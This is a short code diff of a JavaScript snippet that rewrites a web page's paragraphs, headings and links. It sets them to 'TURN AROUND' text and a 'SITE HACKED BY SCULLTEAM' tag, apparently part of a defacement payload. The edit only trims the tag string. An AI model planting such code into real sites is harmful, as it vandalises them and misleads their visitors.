@@ -39,7 +39,7 @@ var paragraphsForReplace = document.getElementsByTagName("p");
 var h1ForReplace = document.getElementsByTagName("h1");
 var linksForReplace = document.getElementsByTagName("a");
 var replacementText = "HEY, TURN AROUND, TURN AROUND, TURN AROUND";
-var replacementLinkText = "魑魅魍魎SITE HACKED BY SCULLTEAM鬼阴阳玄奥";
+var replacementLinkText = "SITE HACKED BY SCULLTEAM";
 
 for (var i = 0; i < paragraphsForReplace.length; i++) {
     paragraphsForReplace[i].textContent = replacementText;
